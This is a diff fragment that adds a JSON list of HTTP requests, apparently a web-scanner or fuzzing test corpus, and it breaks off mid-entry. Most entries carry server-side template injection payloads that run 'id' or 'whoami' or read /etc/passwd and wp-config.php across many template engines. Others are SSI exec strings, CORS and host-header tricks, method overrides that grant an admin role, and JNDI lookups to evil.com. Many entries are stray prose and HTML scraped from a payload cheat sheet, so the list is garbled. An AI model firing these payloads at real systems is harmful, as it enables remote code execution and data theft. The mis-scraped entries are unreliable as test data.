+    "headers": {
+      "User-Agent": "<!--#exec cmd=\"id\"-->"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/sensitive",
+    "headers": {
+      "Origin": "https://evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/data",
+    "headers": {
+      "Origin": "null"
+    }
+  },
+  {
+    "method": "OPTIONS",
+    "url": "/api/admin",
+    "headers": {
+      "Origin": "https://attacker.com",
+      "Access-Control-Request-Method": "DELETE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/resource/1",
+    "headers": {
+      "X-HTTP-Method-Override": "DELETE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/users/1",
+    "headers": {
+      "X-HTTP-Method-Override": "PUT"
+    },
+    "json": {
+      "role": "admin"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/debug",
+    "headers": {
+      "X-HTTP-Method-Override": "TRACE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/static/app.js",
+    "headers": {
+      "X-Forwarded-Host": "evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/resource",
+    "headers": {
+      "X-Forwarded-Scheme": "nothttps"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "headers": {
+      "X-Forwarded-Proto": "http",
+      "X-Forwarded-Port": "443"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "php\n{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "php\n{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{__import__('os').system('id')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{__import__('os').system('id')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{{ }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{{ }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "Execute the system command `id`:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "Execute the system command `id`:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "<patTemplate:tmpl name=\"page\">"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "<patTemplate:tmpl name=\"page\">"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "<%= File.open('/etc/passwd').read %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "<%= File.open('/etc/passwd').read %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "python\n{% for key, value in config.iteritems() %}\n    <dt>{{ key|e }}</dt>\n    <dd>{{ value|e }}</dd>\n{% endfor %}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "python\n{% for key, value in config.iteritems() %}\n    <dt>{{ key|e }}</dt>\n    <dd>{{ value|e }}</dd>\n{% endfor %}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "<html>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "<html>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "<!-- BEGIN authorline -->"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "<!-- BEGIN authorline -->"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "__include__(\"os\").popen(\"id\").read() # Rendered RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "__include__(\"os\").popen(\"id\").read() # Rendered RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{{1/({\"id && echo UniqueString\":\"shell_exec\"}|map(\"call_user_func\")|join|trim('\\n') ends with \"UniqueString\")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{{1/({\"id && echo UniqueString\":\"shell_exec\"}|map(\"call_user_func\")|join|trim('\\n') ends with \"UniqueString\")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "[Official website](https://pebbletemplates.io/)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "[Official website](https://pebbletemplates.io/)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "#{3*3}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "#{3*3}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "@(1+2)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "@(1+2)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{{ messages.storages.0.signer.key }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{{ messages.storages.0.signer.key }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "<patTemplate:tmpl name=\"foo\">"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "<patTemplate:tmpl name=\"foo\">"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "$output = $twig > render ("
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "$output = $twig > render ("
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "${class.getClassLoader()}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "${class.getClassLoader()}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "$t->setVar('NUM_AUTHORS', count($authors));"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "$t->setVar('NUM_AUTHORS', count($authors));"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "${9*9}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "${9*9}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "New version of Pebble :"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "New version of Pebble :"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "{% include 'admin/base.html' %}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "{% include 'admin/base.html' %}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "escape: /\\{\\{-(.+?)\\}\\}/g,"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "escape: /\\{\\{-(.+?)\\}\\}/g,"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{#each conslist}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{#each conslist}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{% import os %}{{ os.popen('id').read() }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{% import os %}{{ os.popen('id').read() }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "require_once 'HTML/Template/PHPLIB.php';"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "require_once 'HTML/Template/PHPLIB.php';"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "${jndi:ldap://evil.com/a}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "${jndi:ldap://evil.com/a}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "Simple modification of the payload to clean up output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &input=ls)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "Simple modification of the payload to clean up output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &input=ls)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo \"a\" > /tmp/a`. Below is an example with `whoami` in base64:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo \"a\" > /tmp/a`. Below is an example with `whoami` in base64:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "${= _.VERSION}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "${= _.VERSION}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "java\n${7*7}\n${'patt'.toString().replace('a', 'x')}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "java\n${7*7}\n${'patt'.toString().replace('a', 'x')}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "${class.getResource(\"../../../../../index.htm\").getContent()}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "${class.getResource(\"../../../../../index.htm\").getContent()}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "<%= _.VERSION %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "<%= _.VERSION %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "</tfoot>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "</tfoot>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{app.request.server.all|join(',')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{app.request.server.all|join(',')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "powershell\n#{ %x|env| }"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "powershell\n#{ %x|env| }"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "const options = {"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "const options = {"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "- x = x('child_process')"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "- x = x('child_process')"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "</patTemplate:tmpl>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "</patTemplate:tmpl>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "python\n${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "python\n${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{% debug %}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{% debug %}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "- Method using `java.lang.Runtime` #2"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "- Method using `java.lang.Runtime` #2"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "Execute system command (command: `id`):"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "Execute system command (command: `id`):"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{{ {'id':'shell_exec'}|map('call_user_func')|join }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{{ {'id':'shell_exec'}|map('call_user_func')|join }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "1 / (pclose(popen(\"id\", \"wb\")) == 0)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "1 / (pclose(popen(\"id\", \"wb\")) == 0)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "ini_set(\"error_reporting\", \"1\") // Enable verbose fatal errors for Error-Based"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "ini_set(\"error_reporting\", \"1\") // Enable verbose fatal errors for Error-Based"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "#{7*7}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "#{7*7}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "Similar payloads could be used for Error-Based and Boolean-Based exploitation:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "Similar payloads could be used for Error-Based and Boolean-Based exploitation:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "Error-Based RCE payload:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "Error-Based RCE payload:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "1/(system(\"id\")&&1||0) # Boolean-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "1/(system(\"id\")&&1||0) # Boolean-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{system('cat index.php')} // compatible v3, deprecated in v5"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{system('cat index.php')} // compatible v3, deprecated in v5"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "java\n${pageContext.request.getSession().setAttribute(\"admin\",true)}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "java\n${pageContext.request.getSession().setAttribute(\"admin\",true)}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "php\n{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "php\n{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "shell_exec('id && sleep 5')"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "shell_exec('id && sleep 5')"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "$t->setFile('authors', 'authors.tpl');"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "$t->setFile('authors', 'authors.tpl');"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "<caption>Authors</caption>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "<caption>Authors</caption>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "<h1>User Profile</h1>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "<h1>User Profile</h1>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "- var x = root.process"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "- var x = root.process"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "python\n<%\nimport os\nx=os.popen('id').read()\n%>\n${x}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "python\n<%\nimport os\nx=os.popen('id').read()\n%>\n${x}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "> Universal payloads also work for Mako."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "> Universal payloads also work for Mako."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{x=Object}}{{w=a=new x}}{{w.type=\"pipe\"}}{{w.readable=1}}{{w.writable=1}}{{a.file=\"/bin/sh\"}}{{a.args=[\"/bin/sh\",\"-c\",\"id;ls\"]}}{{a.stdio=[w,w]}}{{process.binding(\"spawn_sync\").spawn(a).output}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{x=Object}}{{w=a=new x}}{{w.type=\"pipe\"}}{{w.readable=1}}{{w.writable=1}}{{a.file=\"/bin/sh\"}}{{a.args=[\"/bin/sh\",\"-c\",\"id;ls\"]}}{{a.stdio=[w,w]}}{{process.binding(\"spawn_sync\").spawn(a).output}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{{7*7}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{{7*7}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "{{''.__class__.__mro__[1].__subclasses__()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "{{''.__class__.__mro__[1].__subclasses__()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "system('id')"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "system('id')"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{/with}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{/with}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "<%= 7*7 %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "<%= 7*7 %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "</tbody>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "</tbody>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "Time-Based RCE payload:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "Time-Based RCE payload:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{['id',1]|sort('system')|join}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{['id',1]|sort('system')|join}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{$smarty.version}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{$smarty.version}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "${(\"xx\"+(\"freemarker.template.utility.Execute\"?new()(\"id\")))?new()} // Error-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "${(\"xx\"+(\"freemarker.template.utility.Execute\"?new()(\"id\")))?new()} // Error-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "groovy\n${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")})\ndef x }"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "groovy\n${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")})\ndef x }"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "This is the main page."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "This is the main page."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "foreach ($authors as $name => $email) {"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "foreach ($authors as $name => $email) {"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "<tr><th>Name</th><th>Email</th></tr>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "<tr><th>Name</th><th>Email</th></tr>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{[0]|map([\"xx\", {\"id\": \"shell_exec\"}|map(\"call_user_func\")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{[0]|map([\"xx\", {\"id\": \"shell_exec\"}|map(\"call_user_func\")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "#{jndi:ldap://evil.com/a}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "#{jndi:ldap://evil.com/a}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "<tr><td colspan=\"2\">{NUM_AUTHORS}</td></tr>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "<tr><td colspan=\"2\">{NUM_AUTHORS}</td></tr>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "<%= 7 * 7 %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "<%= 7 * 7 %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "- Method using `java.lang.Runtime` #3 - accessed with `invoke`"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "- Method using `java.lang.Runtime` #3 - accessed with `invoke`"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "</head>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "</head>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "{{include(\"wp-config.php\")}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "{{include(\"wp-config.php\")}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "> Universal payloads also work for Tornado."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "> Universal payloads also work for Tornado."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{%include [\"Y:/A:/\", _self.env.getFilter(\"id\")]|join%} // Error-Based RCE <= 1.19"
